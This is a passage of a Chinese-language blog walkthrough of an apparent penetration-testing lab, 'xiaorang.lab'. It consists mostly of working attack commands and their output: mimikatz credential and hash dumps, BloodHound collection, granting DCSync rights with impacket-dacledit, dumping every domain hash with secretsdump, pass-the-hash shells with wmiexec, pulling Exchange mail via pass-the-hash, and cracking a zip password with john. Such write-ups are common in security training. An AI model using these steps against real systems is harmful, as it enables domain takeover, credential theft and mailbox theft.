+	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
+	tspkg :	
+	wdigest :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 104420 (00000000:000197e4)
+Session           : Service from 0
+User Name         : Zhangtong
+Domain            : XIAORANG
+Logon Server      : XIAORANG-WIN16
+Logon Time        : 2026/9/20 18:34:32
+SID               : S-1-5-21-533686307-2117412543-4200729784-1147
+	msv :	
+	 [00000003] Primary
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
+	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
+	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
+	tspkg :	
+	wdigest :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:31
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 66384 (00000000:00010350)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:31
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 9587463cfa3fd1ea760c401e2c52e224
+	 * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96 
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # lsadump::sam
+Domain : XIAORANG-EXC01
+SysKey : 52cd58bcb44860d88b3b68fda24283aa
+Local SID : S-1-5-21-804691931-3750513266-524628342
+
+SAMKey : d1e610fe23445707a9c8c8dd27014a43
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 9dca627bdcde6df114a3c4a18a09765d
+    lm  - 0: 8f9188e292045aa30b64b85731daf520
+    lm  - 1: 6f281d0603d437045369becfcf5255f2
+    ntlm- 0: 9dca627bdcde6df114a3c4a18a09765d
+    ntlm- 1: 9dca627bdcde6df114a3c4a18a09765d
+    ntlm- 2: 9dca627bdcde6df114a3c4a18a09765d
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000003e8 (1000)
+User : mj
+  Hash NTLM: afffeba176210fad4628f0524bfe1942
+    lm  - 0: 4df1389f4b67e1e95c0d496ed6ef7bb4
+    ntlm- 0: afffeba176210fad4628f0524bfe1942
+
+mimikatz(commandline) # lsadump::cache
+Domain : XIAORANG-EXC01
+SysKey : 52cd58bcb44860d88b3b68fda24283aa
+
+Local name : XIAORANG-EXC01 ( S-1-5-21-804691931-3750513266-524628342 )
+Domain name : XIAORANG ( S-1-5-21-533686307-2117412543-4200729784 )
+Domain FQDN : xiaorang.lab
+
+Policy subsystem is : 1.14
+LSA Key(s) : 1, default {83a0f89f-4c49-337e-7789-3bf980f8f58f}
+  [00] {83a0f89f-4c49-337e-7789-3bf980f8f58f} 4038a425afb859524da184e7bb4d36834a1aa5dd839ae253757530e912b2bedb
+
+* Iteration is set to default (10240)
+
+[NL$1 - 2022/10/23 15:43:43]
+RID       : 000001f4 (500)
+User      : XIAORANG\Administrator
+MsCacheV2 : c50d707083f6394c2562e48fadda22b8
+
+[NL$2 - 2022/10/23 21:53:04]
+RID       : 000001f4 (500)
+User      : XIAORANG\Administrator
+MsCacheV2 : c50d707083f6394c2562e48fadda22b8
+
+[NL$3 - 2026/9/20 18:56:26]
+RID       : 0000047b (1147)
+User      : XIAORANG\Zhangtong
+MsCacheV2 : 931f2a4343003481495093dd1db539a5
+
+[NL$4 - 2022/10/23 22:25:31]
+RID       : 000001f4 (500)
+User      : XIAORANG\Administrator
+MsCacheV2 : c50d707083f6394c2562e48fadda22b8
+
+[NL$5 - 2022/10/23 22:27:54]
+RID       : 000001f4 (500)
+User      : XIAORANG\Administrator
+MsCacheV2 : c50d707083f6394c2562e48fadda22b8
+
+mimikatz(commandline) # exit
+Bye!
+
+</code></pre>
+<p>有机器账户的hash和zhangtong的hash，可以收集下域内信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
+└─<span class="pl-c"><span class="pl-c">#</span> pc -q python3 bloodhound.py -u "XIAORANG-EXC01$" --hashes :57ea01ab0edb0e8a9f2294600fcbabe9 -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip                  INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)</span>
+INFO: Found AD domain: xiaorang.lab
+INFO: Connecting to LDAP server: XIAORANG-WIN16.xiaorang.lab
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="pl-k">in</span> the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: XIAORANG-WIN16.xiaorang.lab
+INFO: Found 28 users
+INFO: Found 73 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 22 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: XIAORANG-PC.xiaorang.lab
+INFO: Querying computer: XIAORANG-EXC01.xiaorang.lab
+INFO: Querying computer: XIAORANG-WIN16.xiaorang.lab
+INFO: Done <span class="pl-k">in</span> 00M 21S
+INFO: Compressing output into 20260920194241_bloodhound.zip</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d960729c-ada9-43c2-be3c-dc09e8f12156"><img width="2000" height="1061" alt="Image" src="https://github.com/user-attachments/assets/d960729c-ada9-43c2-be3c-dc09e8f12156" style="max-width: 100%; height: auto; max-height: 1061px;; aspect-ratio: 2000 / 1061; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<p>可以看到EX01这台机器对域内用户有WriteDacl权限，所以赋予域内一个用户DCsync然后直接打域控即可</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
+└─<span class="pl-c"><span class="pl-c">#</span> pc -q impacket-dacledit -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' 'xiaorang.lab/XIAORANG-EXC01$' -hashes :57ea01ab0edb0e8a9f2294600fcbabe9 -dc-ip 172.22.3.2</span>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[<span class="pl-k">*</span>] DACL backed up to dacledit-20260920-195132.bak
+[<span class="pl-k">*</span>] DACL modified successfully<span class="pl-k">!</span></pre></div>
+<p>然后直接dump全域hash</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
+└─<span class="pl-c"><span class="pl-c">#</span> pc -q impacket-secretsdump 'xiaorang.lab/Zhangtong'@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[<span class="pl-k">*</span>] Dumping Domain Credentials (domain<span class="pl-cce">\u</span>id:rid:lmhash:nthash)
+[<span class="pl-k">*</span>] Using the DRSUAPI method to get NTDS.DIT secrets
+xiaorang.lab<span class="pl-cce">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\$</span>431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\S</span>M_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6743b82b1feb392408a6fbece086f90b:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:502317e49505021d7ffb417540f16f99:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::
+xiaorang.lab<span class="pl-cce">\H</span>ealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::
+xiaorang.lab<span class="pl-cce">\L</span>umia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::
+Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::
+XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:060c4fe04d931a6dbb552004b4ef1008:::
+XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:57ea01ab0edb0e8a9f2294600fcbabe9:::
+XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:58e884042659c325bdd890b1a8b6460d:::</pre></div>
+<p>拿上域管pth就行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
+└─<span class="pl-c"><span class="pl-c">#</span> pc -q impacket-wmiexec xiaorang.lab/administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2  Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span>
+
+[<span class="pl-k">*</span>] SMBv3.0 dialect used
+[<span class="pl-k">!</span>] Launching semi-interactive shell - Careful what you execute
+[<span class="pl-k">!</span>] Press <span class="pl-c1">help</span> <span class="pl-k">for</span> extra shell commands
+C:<span class="pl-cce">\&gt;</span>whoami
+xiaorang<span class="pl-cce">\a</span>dministrator</pre></div>
+<p>横向到26</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange]
+└─# pc -q python3 pthexchange.py --target https://172.22.3.9 --username "Lumia" --password "00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296" --action Download
+2026-09-20 20:02:24,878 - DEBUG - [Stage 777] Get Mails Stage 1 Finditem ing...
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+2026-09-20 20:02:25,859 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
+2026-09-20 20:02:28,341 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
+[+] Item [output/item-0.eml] saved successfully
+2026-09-20 20:02:28,344 - DEBUG - [Stage 555] Ready Download Attachmenting...
+2026-09-20 20:02:28,414 - DEBUG - [Stage 555] Determine if there are attachments in the email...
+2026-09-20 20:02:28,414 - DEBUG - [Stage 555] This Mail Has Attachment...
+2026-09-20 20:02:28,414 - DEBUG - [Stage 555] Start Get Attachment Content...
+2026-09-20 20:02:30,497 - DEBUG - [Stage 555] Start Download Attachment...
+[+] Item [output/item-0-secret.zip] saved successfully
+2026-09-20 20:02:30,498 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
+2026-09-20 20:02:30,660 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
+[+] Item [output/item-1.eml] saved successfully
+2026-09-20 20:02:30,660 - DEBUG - [Stage 555] Ready Download Attachmenting...
+2026-09-20 20:02:30,718 - DEBUG - [Stage 555] Determine if there are attachments in the email...
+2026-09-20 20:02:30,718 - DEBUG - [Stage 555] This Mail Has Attachment...
+2026-09-20 20:02:30,718 - DEBUG - [Stage 555] Start Get Attachment Content...
+2026-09-20 20:02:31,283 - DEBUG - [Stage 555] Start Download Attachment...
+[+] Item [output/item-1-phone lists.csv] saved successfully
+</code></pre>
+<p>把lumia所以邮件都拿下来，两个附件secret.zip和phone</p>
+<p>Encrypt with your phone number.</p>
+<p>意思就手机号就密码</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
+<span class="pl-c"># -*- coding: utf-8 -*-</span>
+
+<span class="pl-k">import</span> <span class="pl-s1">csv</span>
+
+<span class="pl-s1">input_file</span> <span class="pl-c1">=</span> <span class="pl-s">'item-1-phone lists.csv'</span>
+<span class="pl-s1">output_file</span> <span class="pl-c1">=</span> <span class="pl-s">'pass.txt'</span>
+
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">input_file</span>, <span class="pl-s">'r'</span>, <span class="pl-s1">newline</span><span class="pl-c1">=</span><span class="pl-s">''</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">'utf-8'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+    <span class="pl-s1">reader</span> <span class="pl-c1">=</span> <span class="pl-s1">csv</span>.<span class="pl-c1">DictReader</span>(<span class="pl-s1">f</span>)
+    <span class="pl-s1">phones</span> <span class="pl-c1">=</span> [<span class="pl-s1">row</span>[<span class="pl-s">'phone'</span>].<span class="pl-c1">strip</span>() <span class="pl-k">for</span> <span class="pl-s1">row</span> <span class="pl-c1">in</span> <span class="pl-s1">reader</span> <span class="pl-k">if</span> <span class="pl-s1">row</span>[<span class="pl-s">'phone'</span>].<span class="pl-c1">strip</span>()]
+
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">output_file</span>, <span class="pl-s">'w'</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">'utf-8'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+    <span class="pl-k">for</span> <span class="pl-s1">phone</span> <span class="pl-c1">in</span> <span class="pl-s1">phones</span>:
+        <span class="pl-s1">f</span>.<span class="pl-c1">write</span>(<span class="pl-s1">phone</span> <span class="pl-c1">+</span> <span class="pl-s">'<span class="pl-cce">\n</span>'</span>)
+
+<span class="pl-en">print</span>(<span class="pl-s">f'已提取 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">phones</span>)<span class="pl-kos">}</span></span> 个电话号码，写入 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">output_file</span><span class="pl-kos">}</span></span>'</span>)</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange/output]
+└─<span class="pl-c"><span class="pl-c">#</span> john hash.txt --wordlist=pass.txt</span>
+Using default input encoding: UTF-8
+Loaded 1 password <span class="pl-c1">hash</span> (PKZIP [32/64])
+No password hashes left to crack (see FAQ)
+
+
+┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange/output]
+└─<span class="pl-c"><span class="pl-c">#</span> john hash.txt --show</span>
+item-0-secret.zip/flag.docx:18763918468:flag.docx:item-0-secret.zip::item-0-secret.zip
+
+1 password <span class="pl-c1">hash</span> cracked, 0 left</pre></div>
+<p>解压即可</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5203a1b8-0c5c-4e34-9b18-7184c8058ea6"><img width="1428" height="918" alt="Image" src="https://github.com/user-attachments/assets/5203a1b8-0c5c-4e34-9b18-7184c8058ea6" style="max-width: 100%; height: auto; max-height: 918px;; aspect-ratio: 1428 / 918; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
